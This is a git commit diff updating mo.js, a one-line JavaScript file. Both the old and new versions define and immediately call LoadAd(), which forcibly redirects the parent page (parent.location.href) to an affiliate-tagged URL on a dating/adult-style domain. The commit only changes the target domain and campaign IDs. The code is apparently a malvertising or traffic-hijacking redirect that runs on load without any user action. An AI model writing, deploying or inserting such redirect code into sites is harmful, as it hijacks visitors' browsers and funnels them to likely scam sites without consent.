d3597f4a177c5f41e685a680fd2abf53cbaec317
mp3cava <166255594+mp3cava@users.noreply.github.com>
2025-07-05 02:14:55 +0700

    Update mo.js

--- mo.js
+++ mo.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://argbq.fanclfuldates.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=55454&s2=1422095&s5=Trunks&click_id=Trunks"; } LoadAd();
+function LoadAd() { parent.location.href="https://argbq.adoringirl.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=55454&s2=1245716&s5=Story&click_id=Story"; } LoadAd();
